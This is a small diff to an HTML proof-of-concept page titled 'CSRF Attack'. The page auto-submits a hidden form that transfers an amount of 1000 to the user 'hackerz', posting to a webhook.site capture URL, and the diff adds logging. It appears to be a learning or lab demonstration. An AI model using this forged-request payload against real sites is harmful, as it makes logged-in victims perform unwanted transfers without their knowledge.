@@ -4,12 +4,14 @@
     <title>CSRF Attack</title>
 </head>
 <body>
-    <form action="https://webhook.site/a6d320d6-cbaa-4b5c-b216-dfcf9036b541" method="POST">
+    <form id="csrfForm" action="https://webhook.site/a6d320d6-cbaa-4b5c-b216-dfcf9036b541" method="POST">
         <input type="hidden" name="user_to" value="hackerz" />
         <input type="hidden" name="amount" value="1000" />
     </form>
     <script>
-        document.forms[0].submit();
+        console.log("Submitting form...");
+        document.getElementById('csrfForm').submit();
+        console.log("Form submitted!");
     </script>
 </body>
 </html>
